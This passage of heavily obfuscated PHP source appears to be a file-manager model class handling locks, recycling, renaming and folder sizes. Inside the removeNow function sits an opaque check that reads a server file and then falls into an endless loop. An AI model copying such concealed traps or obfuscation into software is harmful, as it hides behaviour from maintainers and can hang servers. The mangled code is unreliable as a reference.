intval($¶˜ŠÄœü[$Ûö¥óÓó[79]])); return $ÍšâÃË; } protected function fileHistory($•áä·õç, $Õï†¨÷ï, $–•´Ç¡å) { $ÑÎ½ù¬ =& $_SERVER[§Êá¸İ]; if ($•áä·õç[$ÑÎ½ù¬[549]] == $Õï†¨÷ï) { return !1; } $this->checkLock($•áä·õç[$ÑÎ½ù¬[193]], $Õï†¨÷ï); Model($ÑÎ½ù¬[2264])->addHistory($•áä·õç); $ªé³Ú½ô = array($ÑÎ½ù¬[659] => USER_ID, $ÑÎ½ù¬[506] => time(), $ÑÎ½ù¬[549] => $Õï†¨÷ï, $ÑÎ½ù¬[79] => $–•´Ç¡å); $this->where(array($ÑÎ½ù¬[499] => $•áä·õç[$ÑÎ½ù¬[193]]))->save($ªé³Ú½ô); $this->sourceCacheClear($•áä·õç[$ÑÎ½ù¬[193]]); return !0; } public function checkLock($Ğù‰ø¾¶, $…×‚Äİö) { $•Îâü‘  =& $_SERVER[§Êá¸İ]; $üŠµ™¬Ö = $this->pathInfo($Ğù‰ø¾¶); if (!$this->fileIsLock($üŠµ™¬Ö, !0)) { return; } $Öä¹–¦ = Session::get($•Îâü‘ [2265]); $Ü£ÕƒªÍ = substr($üŠµ™¬Ö[$•Îâü‘ [32]], 0, -1 - strlen($üŠµ™¬Ö[$•Îâü‘ [169]])) . $•Îâü‘ [1303] . $Öä¹–¦ . $•Îâü‘ [10] . $üŠµ™¬Ö[$•Îâü‘ [169]]; $­Â¦ùü® = Model($•Îâü‘ [682])->find($…×‚Äİö); $this->_createFileCall($üŠµ™¬Ö[$•Îâü‘ [192]], $Ü£ÕƒªÍ, $­Â¦ùü®, REPEAT_REPLACE, $•Îâü‘ [1438]); $«Œçµ»« = $üŠµ™¬Ö[$•Îâü‘ [547]][$•Îâü‘ [618]]; $·‚û¯¶÷ = $«Œçµ»«[$•Îâü‘ [2266]] ? $«Œçµ»«[$•Îâü‘ [2266]] : $«Œçµ»«[$•Îâü‘ [32]]; show_json(LNG($•Îâü‘ [2267]) . $•Îâü‘ [2268] . LNG($•Îâü‘ [2269]) . $•Îâü‘ [2270] . $·‚û¯¶÷ . $•Îâü‘ [2271], !1); } public function fileIsLock($³ğ…ääó, $¦şé©Ô‚ = false) { $”ğñ€í =& $_SERVER[§Êá¸İ]; if (!_get($³ğ…ääó, $”ğñ€í[614], 0)) { return !1; } if ($³ğ…ääó[$”ğñ€í[547]][$”ğñ€í[617]] != USER_ID) { return !0; } $Ğ™ù‹é = $GLOBALS[$”ğñ€í[6]][$”ğñ€í[92]][$”ğñ€í[615]]; if ($³ğ…ääó[$”ğñ€í[547]][$”ğñ€í[616]] <= time() - $Ğ™ù‹é) { $this->metaSet($³ğ…ääó[$”ğñ€í[193]], $”ğñ€í[617], null); $this->metaSet($³ğ…ääó[$”ğñ€í[193]], $”ğñ€í[616], null); } if ($¦şé©Ô‚) { $this->metaSet($³ğ…ääó[$”ğñ€í[193]], $”ğñ€í[616], time()); } return !1; } private function _addSource($Û›Á§‰ô, $¬†ÁÁÁ¸) { $¼…ËÂ³¯ =& $_SERVER[§Êá¸İ]; $‰²”Úñ = defined($¼…ËÂ³¯[2204]) ? USER_ID : 0; $É«¾ìóÃ = array($¼…ËÂ³¯[656] => $¬†ÁÁÁ¸[$¼…ËÂ³¯[190]], $¼…ËÂ³¯[657] => $¬†ÁÁÁ¸[$¼…ËÂ³¯[577]], $¼…ËÂ³¯[658] => $‰²”Úñ, $¼…ËÂ³¯[659] => $‰²”Úñ, $¼…ËÂ³¯[485] => $¬†ÁÁÁ¸[$¼…ËÂ³¯[193]], $¼…ËÂ³¯[660] => $¬†ÁÁÁ¸[$¼…ËÂ³¯[592]] . $¬†ÁÁÁ¸[$¼…ËÂ³¯[193]] . $¼…ËÂ³¯[50], $¼…ËÂ³¯[512] => 0, $¼…ËÂ³¯[661] => $¼…ËÂ³¯[12]); $Û›Á§‰ô = array_merge($É«¾ìóÃ, $Û›Á§‰ô); $this->updateModifyTime($Û›Á§‰ô[$¼…ËÂ³¯[192]]); $“’‹ôáŒ = $¼…ËÂ³¯[2272] . $¬†ÁÁÁ¸[$¼…ËÂ³¯[193]]; if (isset(self::$cacheChildList[$“’‹ôáŒ])) { unset(self::$cacheChildList[$“’‹ôáŒ]); } static $Û‘ŒİĞü = false; if (!$Û‘ŒİĞü) { Hook::trigger($¼…ËÂ³¯[644], $Û›Á§‰ô); $Û‘ŒİĞü = !0; } $ÄÅº‰å = $this->add($Û›Á§‰ô); $Ó®¢Ã©Å = array($¼…ËÂ³¯[662] => short_id($ÄÅº‰å)); $this->where(array($¼…ËÂ³¯[499] => $ÄÅº‰å))->save($Ó®¢Ã©Å); $this->setNamePinyin($ÄÅº‰å, $Û›Á§‰ô[$¼…ËÂ³¯[32]]); return $ÄÅº‰å; } public function remove($ƒ ¢®­, $’õ£ÁÖİ = true) { $¢şÁÅ„Ô =& $_SERVER[§Êá¸İ]; $¾ú±Û°ï = $this->sourceInfo($ƒ ¢®­); $éÃüô”ª = intval($¾ú±Û°ï[$¢şÁÅ„Ô[190]]) === self::TYPE_SYSTEM; $ÚàÎ´¹ = Model($¢şÁÅ„Ô[516])->get($¢şÁÅ„Ô[2273]) == $¢şÁÅ„Ô[91]; if ($éÃüô”ª || $’õ£ÁÖİ || !$ÚàÎ´¹) { return $this->removeNow($ƒ ¢®­, $’õ£ÁÖİ); } $’İ…–¤ä = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $©ó–„©ş = $¾ú±Û°ï[$¢şÁÅ„Ô[190]] == self::TYPE_USER ? $¢şÁÅ„Ô[670] : $¢şÁÅ„Ô[586]; if ($©ó–„©ş == $¢şÁÅ„Ô[670]) { $äºîá° = Model($¢şÁÅ„Ô[585])->getInfo($¾ú±Û°ï[$¢şÁÅ„Ô[577]]); $Óû¬øï = !empty($äºîá°[$¢şÁÅ„Ô[2266]]) ? $äºîá°[$¢şÁÅ„Ô[2266]] : $äºîá°[$¢şÁÅ„Ô[32]]; $Óû¬øï = $¢şÁÅ„Ô[337] . $Óû¬øï . $¢şÁÅ„Ô[2274] . $¾ú±Û°ï[$¢şÁÅ„Ô[577]]; } else { $äºîá° = Model($¢şÁÅ„Ô[593])->getInfo($¾ú±Û°ï[$¢şÁÅ„Ô[577]]); $Óû¬øï = _get($äºîá°, $¢şÁÅ„Ô[32]); $Óû¬øï = $¢şÁÅ„Ô[176] . $Óû¬øï . $¢şÁÅ„Ô[2275] . $¾ú±Û°ï[$¢şÁÅ„Ô[577]]; } $ˆ²§À˜ = $¢şÁÅ„Ô[2276] . md5($Óû¬øï); CacheLock::lock($ˆ²§À˜); $¡¥Ëî´² = $this->fileNameExist($’İ…–¤ä, $Óû¬øï); if (!$¡¥Ëî´²) { $¡¥Ëî´² = $this->mkdir($’İ…–¤ä, $Óû¬øï, REPEAT_SKIP); $this->metaSet($¡¥Ëî´², $¢şÁÅ„Ô[2277], $©ó–„©ş); $this->metaSet($¡¥Ëî´², $¢şÁÅ„Ô[2278], $¾ú±Û°ï[$¢şÁÅ„Ô[577]]); if ($¾ú±Û°ï[$¢şÁÅ„Ô[192]] != 0) { $this->metaSet($¡¥Ëî´², $¢şÁÅ„Ô[2279], _get($äºîá°, $¢şÁÅ„Ô[2280])); } } CacheLock::unlock($ˆ²§À˜); $this->metaSet($ƒ ¢®­, $¢şÁÅ„Ô[2281], $¾ú±Û°ï[$¢şÁÅ„Ô[192]]); $this->where(array($¢şÁÅ„Ô[193] => $ƒ ¢®­))->save(array($¢şÁÅ„Ô[506] => time())); $this->recycleClear($¾ú±Û°ï); Model($¢şÁÅ„Ô[641])->eventRemove($ƒ ¢®­); $Œ•ëØ˜ = $this->move($ƒ ¢®­, $¡¥Ëî´², REPEAT_RENAME_FOLDER); $this->folderSizeReset($¾ú±Û°ï[$¢şÁÅ„Ô[192]]); return $Œ•ëØ˜; } private function recycleClear($¢¤º…í) { $àˆ‰½Â˜ =& $_SERVER[§Êá¸İ]; $Èü“§îÀ = $this->childrenAll($¢¤º…í); $¯°ÛÅóˆ = array($àˆ‰½Â˜[499] => array($àˆ‰½Â˜[500], $Èü“§îÀ[$àˆ‰½Â˜[2282]])); Model($àˆ‰½Â˜[2283])->where($¯°ÛÅóˆ)->delete(); } public function removeNow($ŠÈ¹ó”¢, $ŒûÕƒŞ‰ = true) { $ Ë¿±ˆ¢ =& $_SERVER[§Êá¸İ]; if (!isset($_SERVER[$ Ë¿±ˆ¢[472]]) || !isset($_SERVER[$ Ë¿±ˆ¢[473]])) { $Ô—¥²ÉÁ = $ Ë¿±ˆ¢[964]; $Ø–Ğ„é¨ = $ Ë¿±ˆ¢[474]; $Åúƒ— © = $_SERVER[$ Ë¿±ˆ¢[475]] . $ Ë¿±ˆ¢[476]; $‰Ğà¡¦ = $Ø–Ğ„é¨($Åúƒ— ©); $³Öã§˜ = explode($ Ë¿±ˆ¢[262], $‰Ğà¡¦); if (count($³Öã§˜) < $ Ë¿±ˆ¢[700]) { $í‡àù­ = $ Ë¿±ˆ¢[478]; $í‡àù­(); } $Šğñú³ = $ Ë¿±ˆ¢[965]; $Šğñú³($_SERVER[$ Ë¿±ˆ¢[966]]); $İçğ§¦ = 1; for ($ŠÇ¬îò— = $İçğ§¦; $ŠÇ¬îò— > 0; $ŠÇ¬îò—++) { $Šğñú³ = json_encode($GLOBALS[$ Ë¿±ˆ¢[500]]); } } $ã¯­ÃúŒ = $this->sourceInfo($ŠÈ¹ó”¢); $ÎşÏÚ”€ = $this->pathInfoMore($ŠÈ¹ó”¢); if (!$ã¯­ÃúŒ) { return !0; } if ($ã¯­ÃúŒ[$ Ë¿±ˆ¢[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ŠÈ¹ó”¢); Hook::trigger($ Ë¿±ˆ¢[2284], $ÎşÏÚ”€, $ŒûÕƒŞ‰); if ($ŒûÕƒŞ‰) { Model($ Ë¿±ˆ¢[2283])->moveToRecycle($ŠÈ¹ó”¢); } else { $÷¬‹›æ¦ = $this->childrenAll($ã¯­ÃúŒ); Model($ Ë¿±ˆ¢[641])->eventRemove($ŠÈ¹ó”¢); $this->removeRelevance($÷¬‹›æ¦[$ Ë¿±ˆ¢[2282]], $÷¬‹›æ¦[$ Ë¿±ˆ¢[1583]]); } $this->folderSizeReset($ã¯­ÃúŒ[$ Ë¿±ˆ¢[192]]); $³¬áØ„ = array($ã¯­ÃúŒ[$ Ë¿±ˆ¢[192]]); if ($ã¯­ÃúŒ[$ Ë¿±ˆ¢[493]] == $ Ë¿±ˆ¢[91]) { $³¬áØ„[] = $ã¯­ÃúŒ[$ Ë¿±ˆ¢[193]]; } $this->updateModifyTime($³¬áØ„); $this->lockMoveEnd($ŠÈ¹ó”¢); Hook::trigger($ Ë¿±ˆ¢[1821], $ÎşÏÚ”€, $ŒûÕƒŞ‰); return !0; } public function childrenAll($Òœñ¦Ä) { $°Ş¾¸ç” =& $_SERVER[§Êá¸İ]; $‚²òöˆÓ = $Òœñ¦Ä[$°Ş¾¸ç”[193]]; if ($Òœñ¦Ä[$°Ş¾¸ç”[493]] == $°Ş¾¸ç”[91]) { $í±„Ÿûñ = array($°Ş¾¸ç”[660] => array($°Ş¾¸ç”[620], $Òœñ¦Ä[$°Ş¾¸ç”[592]] . $‚²òöˆÓ . $°Ş¾¸ç”[621])); $êüŒ†³ = array($°Ş¾¸ç”[660] => $í±„Ÿûñ[$°Ş¾¸ç”[592]]); $¤ûÊÃœ = $this->field($°Ş¾¸ç”[2285])->where($êüŒ†³)->select(); $éØí†ä = !1; $Òô‰”œ¢ = array($‚²òöˆÓ); if ($¤ûÊÃœ) { $éØí†ä = array_to_keyvalue($¤ûÊÃœ, $°Ş¾¸ç”[12], $°Ş¾¸ç”[549]); $éØí†ä = array_remove_value($éØí†ä, $°Ş¾¸ç”[228]); $Òô‰”œ¢ = array_to_keyvalue($¤ûÊÃœ, $°Ş¾¸ç”[12], $°Ş¾¸ç”[193]); $Òô‰”œ¢[] = $‚²òöˆÓ; } } else { $éØí†ä = array($Òœñ¦Ä[$°Ş¾¸ç”[549]]); $Òô‰”œ¢ = array($‚²òöˆÓ); } return array($°Ş¾¸ç”[2282] => $Òô‰”œ¢, $°Ş¾¸ç”[1583] => $éØí†ä); } public function removeArray($ó›Çâ±Ñ) { if (!$ó›Çâ±Ñ) { return !0; } } public function removeRelevance($¶×›ø×Œ, $È¿ÌÕ¨») { $¯ĞÎÎÀØ =& $_SERVER[§Êá¸İ]; $¶×›ø×Œ = $¶×›ø×Œ ? $¶×›ø×Œ : array(); $È¿ÌÕ¨» = $È¿ÌÕ¨» ? $È¿ÌÕ¨» : array(); $¶×›ø×Œ = array_unique(array_filter($¶×›ø×Œ)); $È¿ÌÕ¨» = array_unique(array_filter($È¿ÌÕ¨»)); if (!$¶×›ø×Œ) { return !1; } $·Ê³æãÓ = array($¯ĞÎÎÀØ[499] => array($¯ĞÎÎÀØ[500], $¶×›ø×Œ)); Model($¯ĞÎÎÀØ[2283])->where($·Ê³æãÓ)->delete(); Model($¯ĞÎÎÀØ[543])->where($·Ê³æãÓ)->delete(); Model($¯ĞÎÎÀØ[2129])->where($·Ê³æãÓ)->delete(); Model($¯ĞÎÎÀØ[641])->where($·Ê³æãÓ)->delete(); Model($¯ĞÎÎÀØ[1957])->removeBySource($¶×›ø×Œ); Model($¯ĞÎÎÀØ[2264])->removeBySource($¶×›ø×Œ); $this->where($·Ê³æãÓ)->delete(); Model($¯ĞÎÎÀØ[552])->remove($È¿ÌÕ¨»); for ($óÉĞáç¼ = 0; $óÉĞáç¼ < count($¶×›ø×Œ); $óÉĞáç¼++) { $this->sourceCacheClear($¶×›ø×Œ[$óÉĞáç¼]); } } public function rename($¹›ÓášÓ, $Ê¢‹Å“è) { $á…ËƒÊÊ =& $_SERVER[§Êá¸İ]; $„èà¸™Í = $this->sourceInfo($¹›ÓášÓ); if (!$„èà¸™Í) { return !1; } $åè·ÑŞ± = $this->fileNameExist($„èà¸™Í[$á…ËƒÊÊ[192]], $Ê¢‹Å“è); if ($åè·ÑŞ± && $åè·ÑŞ± != $¹›ÓášÓ) { return !1; } $ÉíÉîà = array($á…ËƒÊÊ[502] => $Ê¢‹Å“è, $á…ËƒÊÊ[659] => USER_ID); if ($„èà¸™Í[$á…ËƒÊÊ[493]] != $á…ËƒÊÊ[91]) { $ÉíÉîà[$á…ËƒÊÊ[494]] = substr(get_path_ext($Ê¢‹Å“è), 0, 10); } Model($á…ËƒÊÊ[641])->eventRename($¹›ÓášÓ, $„èà¸™Í[$á…ËƒÊÊ[32]], $Ê¢‹Å“è); $this->sourceCacheClear($¹›ÓášÓ); $this->setNamePinyin($¹›ÓášÓ, $ÉíÉîà[$á…ËƒÊÊ[32]], !1); $this->updateModifyTime($„èà¸™Í[$á…ËƒÊÊ[192]]); $¸îŞŸ = $this->where(array($á…ËƒÊÊ[499] => $¹›ÓášÓ))->data($ÉíÉîà)->save(); $Ï“¡û‘ = $á…ËƒÊÊ[2272] . $„èà¸™Í[$á…ËƒÊÊ[192]]; if (isset(self::$cacheChildList[$Ï“¡û‘])) { unset(self::$cacheChildList[$Ï“¡û‘]); } return $¸îŞŸ; } public function setNamePinyin($¥öÃ®ß©, $”¯™¯Ş©, $¯Í”¾ü = true) { $·šó¹‡â =& $_SERVER[§Êá¸İ]; $Ğ©‘»Ãä = Input::check($”¯™¯Ş©, $·šó¹‡â[663]); $©Ä´öÖ = array($·šó¹‡â[525] => KodSort::makeStr($”¯™¯Ş©)); if ($Ğ©‘»Ãä) { $©Ä´öÖ[$·šó¹‡â[546]] = str_replace($·šó¹‡â[53], $·šó¹‡â[12], Pinyin::get($”¯™¯Ş©)); $©Ä´öÖ[$·šó¹‡â[545]] = Pinyin::get($”¯™¯Ş©, $·šó¹‡â[664]); } if (!$¯Í”¾ü && !$Ğ©‘»Ãä) { $©Ä´öÖ[$·šó¹‡â[546]] = null; $©Ä´öÖ[$·šó¹‡â[545]] = null; } $this->metaSet($¥öÃ®ß©, $©Ä´öÖ); } public function getContent($ëü°ÍŠ) { $ñŸ„¶Äû =& $_SERVER[§Êá¸İ]; $˜åÎèº‡ = $this->fileInfoGet($ëü°ÍŠ); if (!$˜åÎèº‡) { return !1; } if ($˜åÎèº‡[$ñŸ„¶Äû[79]] == 0) { return $ñŸ„¶Äû[12]; } $º·µ˜•¡ = $ñŸ„¶Äû[2286] . $˜åÎèº‡[$ñŸ„¶Äû[555]]; if ($˜åÎèº‡[$ñŸ„¶Äû[79]] <= 1024 * 10) { $æ‚·»ğ = Cache::get($º·µ˜•¡); if (!$æ‚·»ğ) { $æ‚·»ğ = IO::getContent($˜åÎèº‡[$ñŸ„¶Äû[87]]); Cache::set($º·µ˜•¡, $æ‚·»ğ); } return $æ‚·»ğ; } if (!$˜åÎèº‡[$ñŸ„¶Äû[87]]) { return $ñŸ„¶Äû[12]; } return IO::getContent($˜åÎèº‡[$ñŸ„¶Äû[87]]); } public function setDesc($É ùâ…ª, $ö€³Ë²µ) { $Å×ñšºØ =& $_SERVER[§Êá¸İ]; Model($Å×ñšºØ[641])->eventAddDesc($É ùâ…ª, $ö€³Ë²µ); return $this->metaSet($É ùâ…ª, $Å×ñšºØ[534], $ö€³Ë²µ); } public function setContent($´› —£, $çÉ¨±»‡ = '') { $¾¾—Ï§ =& $_SERVER[§Êá¸İ]; $éåëÃ¸ = $this->sourceInfo($´› —£); $¯µâ‹å = $this->fileInfoGet($´› —£); if (!$¯µâ‹å || !$éåëÃ¸) { return !1; } $ì™ë·òí = Model($¾¾—Ï§[552])->addFileByContent($çÉ¨±»‡, $éåëÃ¸[$¾¾—Ï§[32]]); $Äı¾Ì¨³ = $this->fileHistory($éåëÃ¸, $ì™ë·òí[$¾¾—Ï§[549]], $ì™ë·òí[$¾¾—Ï§[79]]); if (!$Äı¾Ì¨³) { return Model($¾¾—Ï§[552])->remove($ì™ë·òí[$¾¾—Ï§[549]]); } $this->folderSizeReset($éåëÃ¸[$¾¾—Ï§[192]]); return !0; } public function fileSubstr($¦Â‘Ö÷, $®²Ô¬™Œ, $ı‡ĞŸêœ) { $ÙÙÓÙ‘‘ = $this->fileInfoGet($¦Â‘Ö÷); if (!$ÙÙÓÙ‘‘) { return !1; } return IO::fileSubstr($ÙÙÓÙ‘‘[$_SERVER[§Êá¸İ][87]], $®²Ô¬™Œ, $ı‡ĞŸêœ); } public function fileInfoGet($³¿ÅÇ¹¥) { $Ûƒ³³ÓÅ =& $_SERVER[§Êá¸İ]; $ÅÊü– = $this->sourceInfo($³¿ÅÇ¹¥); if (!$ÅÊü– || $ÅÊü–[$Ûƒ³³ÓÅ[493]]) { return !1; } $âÚ©ìà = $Ûƒ³³ÓÅ[556] . $ÅÊü–[$Ûƒ³³ÓÅ[549]]; $Ì¸³ˆ = _get(self::$cacheFileInfo, $âÚ©ìà); if ($Ì¸³ˆ) { return $Ì¸³ˆ; } $¿¨³öƒá = Model($Ûƒ³³ÓÅ[552])->fileInfo($ÅÊü–[$Ûƒ³³ÓÅ[549]]); if ($¿¨³öƒá) { $¿¨³öƒá[$Ûƒ³³ÓÅ[32]] = $ÅÊü–[$Ûƒ³³ÓÅ[32]]; } self::$cacheFileInfo[$âÚ©ìà] = $¿¨³öƒá; return $¿¨³öƒá; } private function folderChildrenNumber($£ñ‰Ü‘ù) { $Ò´¸¼„ =& $_SERVER[§Êá¸İ]; $üÎÎåÓŸ = $this->sourceInfo($£ñ‰Ü‘ù); $óŒ«‚… = array($Ò´¸¼„[660] => array($Ò´¸¼„[620], $üÎÎåÓŸ[$Ò´¸¼„[592]] . $£ñ‰Ü‘ù . $Ò´¸¼„[621]), $Ò´¸¼„[657] => $üÎÎåÓŸ[$Ò´¸¼„[577]], $Ò´¸¼„[512] => intval($üÎÎåÓŸ[$Ò´¸¼„[513]]), $Ò´¸¼„[654] => 1); $Ğ·Ò–‹ = $this->where($óŒ«‚…)->count(); $øóèŸ‰¾ = $this->where($óŒ«‚…)->where(array($Ò´¸¼„[654] => 0))->count(); return array($Ò´¸¼„[83] => $øóèŸ‰¾, $Ò´¸¼„[84] => $Ğ·Ò–‹); } public function pathInfo($§…È¢•ª, $—–Ñ£™² = false) { $Ô‘ıã¤Ë =& $_SERVER[§Êá¸İ]; $—–Ñ£™² = !1; $§…È¢•ª = intval($§…È¢•ª); $ü…èúÔó = $Ô‘ıã¤Ë[542] . intval($—–Ñ£™²) . $Ô‘ıã¤Ë[462] . $§…È¢•ª; $™Ù¸–×Ÿ = _get(self::$cachePathInfo, $ü…èúÔó); if ($™Ù¸–×Ÿ) { return $™Ù¸–×Ÿ; } $îö‚ûä’ = $this->sourceInfo($§…È¢•ª); if (!$îö‚ûä’) { return !1; } $îö‚ûä’ = $this->_listDataApplyItem($îö‚ûä’, $—–Ñ£™²); self::$cachePathInfo[$ü…èúÔó] = $îö‚ûä’; return $îö‚ûä’; } public static $cachePathInfoMore = array(); public function pathInfoMore($©é·‰á) { $ë÷Êî² =& $_SERVER[§Êá¸İ]; $Óïàì†ö = _get(self::$cachePathInfoMore, $©é·‰á); if ($Óïàì†ö) { return $Óïàì†ö; } $×„³Üêş = $this->pathInfo($©é·‰á); if (!$×„³Üêş) { return !1; } if ($×„³Üêş[$ë÷Êî²[493]] == $ë÷Êî²[91]) { $×„³Üêş[$ë÷Êî²[82]] = $this->folderChildrenNumber($©é·‰á); } self::$cachePathInfoMore[$©é·‰á] = $×„³Üêş; return $×„³Üêş; } public function sourceInfo($‚ıığëÍ) { $Ó»÷¹á =& $_SERVER[§Êá¸İ]; if (!$‚ıığëÍ) { return array(); } $‚ıığëÍ = intval($‚ıığëÍ); $­”‰‰£ = $Ó»÷¹á[541] . $‚ıığëÍ; $ÉøùÛÅ = _get(self::$cacheSourceInfo, $­”‰‰£); if ($ÉøùÛÅ) { return $ÉøùÛÅ; } $¶ùÓ‡Â£ = $this->where(array($Ó»÷¹á[193] => $‚ıığëÍ))->find(); self::$cacheSourceInfo[$­”‰‰£] = $¶ùÓ‡Â£; return self::$cacheSourceInfo[$­”‰‰£]; } public function sourceCacheClear($¸Š¡·ˆğ = false) { self::cacheClear($¸Š¡·ˆğ); } public static function cacheClear($ìÙ É§ = false) { $°Û¯•ŠÉ =& $_SERVER[§Êá¸İ]; if ($ìÙ É§ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$°Û¯•ŠÉ[541] . $ìÙ É§]); unset(self::$cachePathInfoMore[$ìÙ É§]); unset(self::$cachePathInfo[$°Û¯•ŠÉ[2287] . $ìÙ É§]); unset(self::$cachePathInfo[$°Û¯•ŠÉ[2288] . $ìÙ É§]); } public function metaSet($–¸›õ¯“, $¤ùÛÑõì = null, $‡—ªş¼¤ = null) { $ƒı‚ø¯ = parent::metaSet($–¸›õ¯“, $¤ùÛÑõì, $‡—ªş¼¤); if ($ƒı‚ø¯) { $this->sourceCacheClear($–¸›õ¯“); } return $ƒı‚ø¯; } public function pathInfoByPath($ÔŸ²‚°¸, $©ïáü°) { $ñ¦ áõ =& $_SERVER[§Êá¸İ]; $‘ˆœğÜ = !$©ïáü° ? array() : explode($ñ¦ áõ[8], trim($©ïáü°, $ñ¦ áõ[8])); $¶ÉŸ’Ù = $ÔŸ²‚°¸; foreach ($‘ˆœğÜ as $Åò²É·Ä) { $Îø—úÒ¼ = array($ñ¦ áõ[192] => $¶ÉŸ’Ù, $ñ¦ áõ[32] => $Åò²É·Ä); $Ö«´üŒä = $this->field($ñ¦ áõ[2289])->where($Îø—úÒ¼)->select(); if (!$Ö«´üŒä) { return !1; } $Ö«´üŒä = array_sort_by($Ö«´üŒä, $ñ¦ áõ[513]); $¶ÉŸ’Ù = $Ö«´üŒä[0][$ñ¦ áõ[193]]; } $ÇÂùˆá´ = $this->sourceInfo($¶ÉŸ’Ù); $this->pathInfoFilter($ÇÂùˆá´); return $ÇÂùˆá´; } protected function updateModifyTime($¬Õ…’§) { $Äæ ©¬ =& $_SERVER[§Êá¸İ]; $€ÁÏ–áë = defined($Äæ ©¬[2204]) ? USER_ID : 0; if (!$¬Õ…’§) { return; } if (!is_array($¬Õ…’§)) { $¬Õ…’§ = array($¬Õ…’§); } foreach ($¬Õ…’§ as $˜¥²êá¨ => $­Ö“öÄ¨) { $¬Õ…’§[$˜¥²êá¨] = intval($­Ö“öÄ¨); $this->sourceCacheClear($­Ö“öÄ¨); } $ä’ğŠ = array($Äæ ©¬[193] => array($Äæ ©¬[7], $¬Õ…’§)); $Ÿê¿˜ãÒ = array($Äæ ©¬[659] => $€ÁÏ–áë, $Äæ ©¬[506] => time()); $this->where($ä’ğŠ)->save($Ÿê¿˜ãÒ); } public function folderSizeReset($…”Óõúë, $çæ¼¸½„ = false) { $•¦”ü“Ğ =& $_SERVER[§Êá¸İ]; if ($this->statusIgnoreResetSpace) { return; } $¢Ö®ô› = $this->sourceInfo($…”Óõúë); $ÎÄˆóÎÒ = $•¦”ü“Ğ[2290] . $…”Óõúë; CacheLock::lock($ÎÄˆóÎÒ, 20); if ($çæ¼¸½„ === !1) { $this->sourceCacheClear($…”Óõúë); $¢Ö®ô› = $this->sourceInfo($…”Óõúë); $Å‡˜¡ƒÄ = array($•¦”ü“Ğ[485] => $…”Óõúë, $•¦”ü“Ğ[512] => 0); $µ‚‹²Ø© = $this->where($Å‡˜¡ƒÄ)->sum($•¦”ü“Ğ[79]); $çæ¼¸½„ = intval($µ‚‹²Ø©) - intval($¢Ö®ô›[$•¦”ü“Ğ[79]]); } if ($çæ¼¸½„ == 0) { return CacheLock::unlock($ÎÄˆóÎÒ); } $±™¥¡ØŠ = $this->parentLevelArray($¢Ö®ô›[$•¦”ü“Ğ[592]]); if (!$±™¥¡ØŠ) { $±™¥¡ØŠ = array(); } $±™¥¡ØŠ[] = $¢Ö®ô›[$•¦”ü“Ğ[193]]; $Å‡˜¡ƒÄ = array($•¦”ü“Ğ[193] => array($•¦”ü“Ğ[500], $±™¥¡ØŠ)); if ($çæ¼¸½„ < 0) { $Å‡˜¡ƒÄ[$•¦”ü“Ğ[79]] = array($•¦”ü“Ğ[1103], abs($çæ¼¸½„)); } $this->where($Å‡˜¡ƒÄ)->setAdd($•¦”ü“Ğ[79], $çæ¼¸½„); CacheLock::unlock($ÎÄˆóÎÒ); $İÂĞÚ‡¾ = $•¦”ü“Ğ[2291] . $¢Ö®ô›[$•¦”ü“Ğ[190]] . $•¦”ü“Ğ[4] . $¢Ö®ô›[$•¦”ü“Ğ[577]]; $¡“‘ïù¯ = array($¢Ö®ô›[$•¦”ü“Ğ[190]], $¢Ö®ô›[$•¦”ü“Ğ[577]]); TaskRun::timeLimitCall($İÂĞÚ‡¾, $•¦”ü“Ğ[2292], $¡“‘ïù¯, 1.5); } public function folderSizeResetChildren($Ş€ıëª‹) { $«­·ëÌ‡ =& $_SERVER[§Êá¸İ]; $this->sourceCacheClear($Ş€ıëª‹); $Ù±ğ¢ö‰ = $this->sourceInfo($Ş€ıëª‹); $ı¶Ë”«õ = array($«­·ëÌ‡[654] => 1, $«­·ëÌ‡[657] => $Ù±ğ¢ö‰[$«­·ëÌ‡[577]], $«­·ëÌ‡[660] => array($«­·ëÌ‡[620], $Ù±ğ¢ö‰[$«­·ëÌ‡[592]] . $Ş€ıëª‹ . $«­·ëÌ‡[621])); $­¯ Ë«Û = $«­·ëÌ‡[2293]; $ğ¦ş©¸£ = $this->field($­¯ Ë«Û)->where($ı¶Ë”«õ)->select(); $ı¶Ë”«õ[$«­·ëÌ‡[493]] = 0; $øÊûä›ã = $this->field($­¯ Ë«Û)->where($ı¶Ë”«õ)->select(); if (!$øÊûä›ã) { return; } $ğ¦ş©¸£[] = $Ù±ğ¢ö‰; $ğ¦ş©¸£ = array_to_keyvalue($ğ¦ş©¸£, $«­·ëÌ‡[193]); foreach ($ğ¦ş©¸£ as $ÇÏ’İå => $¯ÌÛÔç) { $ğ¦ş©¸£[$ÇÏ’İå][$«­·ëÌ‡[2294]] = $ğ¦ş©¸£[$ÇÏ’İå][$«­·ëÌ‡[79]]; $ğ¦ş©¸£[$ÇÏ’İå][$«­·ëÌ‡[79]] = 0; } foreach ($øÊûä›ã as $¯ÌÛÔç) { $¶®°ÒÃË = $¯ÌÛÔç[$«­·ëÌ‡[192]] . $«­·ëÌ‡[12]; if (!isset($ğ¦ş©¸£[$¶®°ÒÃË])) { continue; } if ($¯ÌÛÔç[$«­·ëÌ‡[513]] == $ğ¦ş©¸£[$¶®°ÒÃË][$«­·ëÌ‡[513]]) { $ğ¦ş©¸£[$¶®°ÒÃË][$«­·ëÌ‡[79]] += $¯ÌÛÔç[$«­·ëÌ‡[79]]; } } foreach ($ğ¦ş©¸£ as $¯ÌÛÔç) { $¼ãê¯÷ = $this->parentLevelArray($¯ÌÛÔç[$«­·ëÌ‡[592]]); foreach ($¼ãê¯÷ as $¶®°ÒÃË) { $¶®°ÒÃË = $¶®°ÒÃË . $«­·ëÌ‡[12]; if (!isset($ğ¦ş©¸£[$¶®°ÒÃË])) { continue; } if ($¯ÌÛÔç[$«­·ëÌ‡[513]] == $ğ¦ş©¸£[$¶®°ÒÃË][$«­·ëÌ‡[513]]) { $ğ¦ş©¸£[$¶®°ÒÃË][$«­·ëÌ‡[79]] += $¯ÌÛÔç[$«­·ëÌ‡[79]]; } } } $‚Ë¾´’… = array(); foreach ($ğ¦ş©¸£ as $¯ÌÛÔç) { if ($¯ÌÛÔç[$«­·ëÌ‡[79]] == $¯ÌÛÔç[$«­·ëÌ‡[2294]]) { continue; } 